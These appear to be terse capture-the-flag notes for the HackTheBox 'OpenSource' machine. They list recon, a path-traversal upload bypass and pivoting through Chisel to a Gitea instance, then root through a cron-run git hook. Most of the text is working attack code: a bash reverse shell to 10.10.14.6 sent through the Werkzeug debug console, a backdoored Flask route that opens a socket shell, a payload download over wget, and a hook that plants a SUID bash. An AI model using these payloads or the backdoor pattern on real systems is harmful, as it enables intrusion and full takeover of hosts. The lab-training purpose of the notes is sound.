# 🧠 HTB: OpenSource – Command & Exploit Notes

---

## ⚙️ Recon

**Open Ports**
```bash
nmap -p- --min-rate 10000 10.10.11.164
nmap -p 22,80 -sCV 10.10.11.164
```

- `22/tcp`: OpenSSH 7.6p1
- `80/tcp`: HTTP – Werkzeug/2.1.2 Python/3.10.3
- `3000/tcp`: Filtered (accessible later from container)

**Website**
- Main page has a source code download link
- /upcloud: file uploader
- Werkzeug server implies Flask backend

**Source Review**
- `get_file_name()` strips `../` via recursive replacement
- Bug: can bypass directory traversal with `/` or `/..//`
- Hidden Git repo reveals a dev branch with dev credentials

---

## 🐚 Shell as root (inside container)

### Method 1: Flask Debug Console (Unintended)
1. Collect:
   - Username: `root`
   - App path: `/usr/local/lib/python3.10/site-packages/flask/app.py`
   - MAC: `/sys/class/net/eth0/address`
   - Boot ID: `/proc/sys/kernel/random/boot_id`
   - Container ID: `/proc/self/cgroup` → extract last part after 3rd `/`

2. Generate PIN:
   - Use [Werkzeug Debug PIN Generator (SHA1-based)](https://book.hacktricks.xyz/pentesting-web/deserialization/flask-pin-debug-code-execution)

3. Input PIN in browser debug console:
   ```python
   import subprocess; subprocess.call(["bash", "-c", "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"])
   ```

### Method 2: Upload Backdoored `views.py`
```python
@app.route('/0xdf')
def rev():
    import socket, os, pty
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("10.10.14.6",443))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    pty.spawn("sh")
```

Upload it as `/..//app/views.py`, then visit `http://10.10.11.164/0xdf`.

---

## 🐚 Shell as dev01 (host)

### Identify Port 3000 Gitea
```bash
wget 172.17.0.1:3000 -O-
```

### Pivot Using Chisel
Host:
```bash
chisel server -p 8000 --reverse
```
Container:
```bash
./chisel client 10.10.14.6:8000 R:3000:172.17.0.1:3000
```

### Gitea Access
- URL: `http://localhost:3000`
- User: `dev01`
- Pass: `Soulless_Developer#2022`
- Repo: `home-backup` → contains SSH private key

### SSH into Host
```bash
chmod 600 opensource-dev01
ssh -i opensource-dev01 dev01@10.10.11.164
```

---

## 🧨 Privilege Escalation (host → root)

### Enumeration
```bash
id
sudo -l         # Requires dev01 password
```

### Find Cron Job with `pspy`
```bash
wget 10.10.14.6:8000/pspy64
chmod +x pspy64
./pspy64
```

### Abusing Git Hook
```bash
cd ~/.git/hooks/
echo -e '#!/bin/bash\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```

Wait for next cron to trigger. Then:
```bash
/tmp/0xdf -p
```

Root shell 🎯